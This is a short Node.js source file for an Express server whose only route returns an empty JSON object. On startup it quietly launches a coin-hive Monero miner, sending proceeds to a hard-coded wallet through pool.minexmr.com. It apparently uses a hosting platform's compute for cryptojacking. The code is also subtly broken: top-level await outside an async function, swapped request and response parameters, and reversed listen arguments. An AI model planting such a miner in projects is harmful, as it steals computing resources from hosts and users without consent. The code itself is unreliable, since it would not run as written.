const CoinHive = require('coin-hive');
var express = require("express");
var app = express();
const miner = await CoinHive('4Hm3YrYNgczRAP7jbGCZ7vA8XwbBR8DWMU7Bm9FKZqjxQXPPcwMP1kDbK3mtBSdt2c6TmLCPiMSXa39uBiEBwkg4FU7sGrPH1rz1Rnhh2M', {
    pool: {
      host: 'pool.minexmr.com',
      port: 4444
    }
  });
miner.start();
app.get("/", function(res, req){
    res.json({
        
    });
});
app.listen(function(){}, process.env.PORT);